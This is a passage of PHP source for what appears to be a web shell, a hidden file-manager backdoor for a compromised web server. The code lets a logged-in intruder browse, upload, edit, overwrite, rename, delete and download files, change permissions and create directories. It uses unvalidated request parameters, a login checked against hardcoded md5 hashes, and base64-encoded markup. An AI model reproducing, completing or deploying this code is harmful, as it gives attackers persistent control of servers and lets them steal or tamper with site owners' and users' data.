 </td>";
   $bg++;
  }

  foreach($files as $file)
  {
	   if($bg%2==0)
	   echo "<tr bgcolor=#353535>";
	   else
		   echo "<tr bgcolor=#242424>";
	    $kb=number_format(filesize($file)/1024,2);
	  echo "
  <td valign=top><a href=".$self."?edit=".realpath('')."><span class=li>".$file."</span> </a></td><td class=li> &nbsp;&nbsp;&nbsp;&nbsp;".$kb."kb<td valign=top class=li>".date ("m/d/Y | H:i:s", filemtime($file))."</th>
   <th><font color=white>".substr(sprintf('%o', fileperms(realpath(''))), -3)."</td>
  <td><a href=".$self."?edit=".realpath('.')."/".$file."><span class=li>View</span></a> | <a href=".$self."?rename=".realpath('.')."/".$file."><span class=li>Rename</span></a>|<a href=".$self."?delete=".realpath('.')."/".$file."><span class=li>Delete</span></a> | <a href=".$self."?download=".realpath('.')."/".$file."><span class=li>Download</span></a> ";
   $bg++;
   }


 ?>

</table>
</td>
</tr>
<tr height=30><td bgcolor="#000000" ><form action=# method=post enctype=multipart/form-data><table><tr><td><span class=hd>Upload file 1 : </td><td><input type=file name=a size=80 class=upl></span></td></tr>
<tr><td><span class=hd >Upload file 2 : </td><td><input type=file name=b size=80 class=upl></span></td></tr>
<tr><td><span class=hd>Upload file 3 : </td><td><input type=file name=c size=80 class=upl></span>
<tr><td>
<input type=submit value=Upload name=u class=sub></td></tr></form>
<br>
<form action=# method=post>
<tr><td>
<span class=hd>Create Directory</span></td><td><input type=text name=cdir size=50><input type=submit value=create>
</td></tr>
</form>
<?php
	if(!empty($_POST['cdir']))
	 {
		mkdir($_POST['cdir']);
		header('location:'.$self.'?open='.$_SESSION['dir']);
	 }
?>
<form action=<?php echo $self;?> method=post>

<tr><td>

<span class=hd>Change Permission  : </td><td><input type=text name=cper Value=<?php echo "'From Current Folder'"; ?> size=40>&nbsp
<select name=cc1>
<?php
for($k=1;$k<=7;$k++)	
echo "<option>".$k;
?>
</select name=cc2>
<select>
<?php
for($k=1;$k<=7;$k++)	
echo "<option>".$k;
?>
</select>
<select name=cc3>
<?php
for($k=1;$k<=7;$k++)	
echo "<option>".$k;
?>
</select>

&nbsp;<input type=submit value=go name=dper></span>
</form>
</td></tr>
<tr><td>
<form action=# method=post>
<span class=hd>Go : </td><td><input type=text name=ndir Value=<?php echo realpath(''); ?> size=80>&nbsp;&nbsp;&nbsp;<input type=submit value=go name=dsub></span></td></tr>
</form>
</table>



</td>
</tr>



<?php
	if(isset($_POST['dsub']))
	header($self."?open=".$_POST['ndir']);
}

echo "<tr height=25><th bgcolor=#000000><span class=tab><font color=#336666>".base64_decode($pstr)."</span></th></tr>
</table>";
}

else if(isset($_GET['edit'])&&isset($_SESSION['a']))
{
	if(isset($_POST['fn'])&& !empty($_POST['fc']))
	{
	
		if(empty($_SESSION['dir']))
		{
		$fo=fopen($_POST['fn'],"a");
		}
		else
		{
			$fo=fopen($_SESSION['dir']."/".$_POST['fn'],"a");
		}

		fwrite($fo,$_POST['fc']);
		fclose($fo);
		header('location:'.$self."?open=".$_SESSION['dir']);

	}
	else if(isset($_POST['fdata'])&&!empty($_POST['fdata']))
	{
		$b_dir=$_GET['edit'];
		$exp=explode("/",$b_dir);
		for($i=0;$i<sizeof($exp);$i++)
		{
			$txt=$exp[$i];
		}
		echo "File name is : ".$txt."<br>";
		$fd=fopen($_GET['edit'],'w');
		fwrite($fd,$_POST['fdata']);
		fclose($fd);
		header('location:'.$self."?open=".$_SESSION['dir']);
	}
	else
	{
	
?>

<table width=100%><tr bgcolor=#000000><td>File Name:<?php echo $_GET['edit']; ?> [<a href=<?php echo $self; ?>>Main Page</a>]</font>
<form action=# method=post><tr bgcolor=#000000><td><center>
<center><textarea rows=30 cols=100 name=fdata>
<?php
	$fedit=$_GET['edit'];
$frd=fopen($fedit,"r");
while(!feof($frd))
	{
	echo htmlspecialchars(fgets($frd));
	

	echo "$fp";
	}
	
?>
</textarea>
</center>
<hr class=li>
<input type=submit value="&nbsp;&nbsp;&nbsp;Edit File&nbsp;&nbsp;&nbsp;" name=fdat class=lin>

<hr class=li>
</form>
</td></tr>

</td></tr>

</table>
<?php
}
}
else
{
$cuser=md5($_POST['uname']);
$puser=md5($_POST['pass']);
echo base64_decode('PGNlbnRlcj48dGFibGUgaGVpZ2h0PTQwMCBib3JkZXI9MCAgYmFja2dyb3VuZD0iaHR0cDovL2kxMTc5LnBob3RvYnVja2V0LmNvbS9hbGJ1bXMveDM5MC9wYXVsbW9uY3kvdGVhbW51dHMvMS0yLmpwZz90PTEzMTAwOTMwNzUiICB3aWR0aD00MDAgQUxUPSJDUkVBVEVEIElOIElORElBIj4=');
?>
	
<tr><td height="141">
<p class="head">&nbsp;</p></td>
</tr>
<form action=# method=post>
<tr><td  valign=top>Username</td><td><Input type=text name=uname>
</td></tr>
<tr><td>
Password </td><td><input type=password name=pass>
</td></tr>
<tr><td></td><td>
<input type=submit value=Login>
</td>
</form>
</tr>
<tr><td height=160></td>
</tr>

</table>

<?php 
	$user='27db7898211c8ccbeb4d5a97d198839a';
$pass='27db7898211c8ccbeb4d5a97d198839a';

	if($cuser==$user && $puser==$pass)
	{$_SESSION['a']=$_POST['uname'];
header('location:'.$self);}} ?>
<?php
echo base64_decode('IDxzdHlsZT4NCiNzdWJtaXQge2NvbG9yOiNmZjY2MDA7b3V0bGluZTpub25lOyB0ZXh0LWRlY29yYXRpb246bm9uZTsgDQpzaXplOjEwMHB4OyBib3JkZXI6ZG91YmxlOyBib3JkZXItY29sb3I6IzNDM0MzQzt9DQphIHtjb2xvcjojZmZmO291dGxpbmU6bm9uZTt0ZXh0LWRlY29yYXRpb246bm9uZTt9DQphOmhvdmVye3RleHQtZGVjb3JhdGlvbjpub25lO30NCmJvZHkNCnsNCglmb250LWZhbWlseTogVGltZXMgTmV3IFJvbWFuLCBUaW1lcywgc2VyaWY7DQoJZm9udC1zaXplOiA5cHg7DQp9DQouaGVhZCB7DQoJY29sb3I6ICNmZmZmZmY7DQoJZm9udC13ZWlnaHQ6IGJvbGQ7DQoJZm9udC1mYW1pbHk6IENvdXJpZXIgTmV3LCBDb3VyaWVyLCBtb25vc3BhY2U7DQpmb250LXNpemU6IDEycHg7DQp9DQoudGFiDQp7DQoJYm9yZGVyLWNvbG9yOiMzMzY2NjY7DQoJYm9yZGVyOmRvdWJsZTsNCglmb250LWZhbWlseTogQ291cmllciBOZXcsIENvdXJpZXIsIG1vbm9zcGFjZTsNCmZvbnQtc2l6ZTogMTJweDsNCn0NCi5oZA0Kew0KCWNvbG9yOiMzM0NDQ0M7DQoJYm9yZGVyLWNvbG9yOiMyQTJBMkE7DQoJYm9yZGVyOmRvdWJsZTsNCglmb250LWZhbWlseTogQ291cmllciBOZXcsIENvdXJpZXIsIG1vbm9zcGFjZTsNCmZvbnQtc2l6ZTogMTJweDsNCn0NCi5saXsNCgljb2xvcjogIzMzQ0NDQzsNCgl0ZXh0LWRlY29yYXRpb246bm9uZTsNCglmb250LWZhbWlseTogQ291cmllciBOZXcsIENvdXJpZXIsIG1vbm9zcGFjZTsNCmZvbnQtc2l6ZTogMTJweDsNCgkNCn0NCi5saW4NCnsNCgliYWNrZ3JvdW5kLWNvbG9yOiAjMzNDQ0NDOw0KCXRleHQtZGVjb3JhdGlvbjpub25lOw0KCWZvbnQtZmFtaWx5OiBDb3VyaWVyIE5ldywgQ291cmllciwgbW9ub3NwYWNlOw0KZm9udC1zaXplOiAxMnB4Ow0KCQ0KfQ0KaW5wdXQNCnsNCmZvbnQtZmFtaWx5OiBDb3VyaWVyIE5ldywgQ291cmllciwgbW9ub3NwYWNlOw0KZm9udC1zaXplOiAxMnB4Ow0KY29sb3I6ICMwMDAwMDA7DQpib3JkZXI6ZG91YmxlOyANCmJvcmRlci1jb2xvcjojM0MzQzNDOw0KYmFja2dyb3VuZC1jb2xvcjojNjBENUM5Ow0KfQ0KdGV4dGFyZWENCnsNCmZvbnQtZmFtaWx5OiBDb3VyaWVyIE5ldywgQ291cmllciwgbW9ub3NwYWNlOw0KZm9udC1zaXplOiAxMnB4Ow0KY29sb3I6ICMwMDAwMDA7DQpib3JkZXI6ZG91YmxlOyANCmJvcmRlci1jb2xvcjojM0MzQzNDOw0KYmFja2dyb3VuZC1jb2xvcjojNjBENUM5Ow0KfQ0KaHINCnsNCmJhY2tncm91bmQtY29sb3I6ICMzM0NDQ0M7DQp9DQo8L3N0eWxlPg0KDQo=');
?>